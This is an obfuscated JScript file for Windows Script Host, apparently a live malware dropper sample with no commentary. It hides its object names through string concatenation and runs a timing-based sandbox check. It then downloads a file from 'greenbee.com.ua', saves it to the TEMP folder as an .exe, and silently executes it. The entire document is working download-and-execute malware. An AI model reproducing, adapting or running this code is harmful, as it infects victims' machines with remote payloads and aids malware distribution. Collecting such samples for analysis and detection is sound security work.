var C0 = false;
var I = "Create"+"Object";
var VJ = function G() {return WScript[I]("WScript"+".Shell");}(), RZ = 11;
var Y = "MSXML2"+".XMLHTTP";
var Y0 = 2;
var NA = Y0 - 2;
function X(E){VJ["Run"](E, NA, NA);};
function P(){return Y + "";};
function SS(R, P0){NA = NA * 1; return R - P0;};
function T(){return I;};
/*@cc_on
  @if (@_win32 || @_win64)
    C0 = true;
  @end
@*/
if (C0)
{
var CL = "";
function Z(){return 22;};
var VW = 0; var FV = 0;
function RP()
{
var OH = new this["Date"]();
var F = OH["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var OH = new this["Date"]();
var LD = OH["getUTCMilliseconds"]();
WScript["Sleep"](Z());
var OH = new this["Date"]();
var Q = OH["getUTCMilliseconds"]();
var VW = "NP";
VW = SS(LD, F);
var FV = "A0";
FV = SS(Q, LD);
CL = "open";
return SS(VW, FV);
}
var JM = false;
var F0 = false;
for (var U = NA; U < Z() * 1; U++){if (RP() != NA){
JM = true; 
FV = "31" + 11 * VW + FV; 
F0 = true; 
break;
}}
function A() {return ((JM == true) && (JM == F0)) ? 1 : NA;};
if (JM && A() && F0){
function NN() {return VJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AOJFub27ba4.ex" + "e";};
 L = P();
 BV = WScript[I](L);
 var G0 = 1;
do { 
	for (;G0;){
	try {
		if (G0 == 1)
		{
			BV[CL]("GET", "http://greenbee.com.ua/b7eosa", false);
			BV["send"]();
			Z0 = "Sleep";
			G0 = 2;
		}
		WScript[Z0](Z() + 120); 
		if (BV["readystate"] < 2 * 2) continue;
		G0 = NA;
		function SD(J) {var C = (1, 2, 3, 4, 5, J); return C;};
		J0 = WScript[T()]("ADODB.Stream");
		L = J0;
		L[CL]();
		L["type"] = SD(1);
		L["write"](BV["ResponseBody"]);
		J0["position"] = SD(NA);
		L["Save" + "ToFile"](NN(), 2);
		J0["cl"+"ose"]();
		TB = NN();
		X(TB);
	} catch(OZ){};};
}while (G0);
}
}

